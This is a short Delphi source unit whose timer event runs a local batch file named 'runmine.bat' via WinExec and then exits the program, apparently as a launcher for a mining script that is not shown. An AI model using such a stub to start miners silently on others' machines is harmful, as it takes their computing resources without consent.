unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls;

type
  TForm1 = class(TForm)
    tmr1: TTimer;
    procedure tmr1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.tmr1Timer(Sender: TObject);
begin
tmr1.Enabled := False;
WinExec('runmine.bat',1);
Application.Terminate;
end;

end.
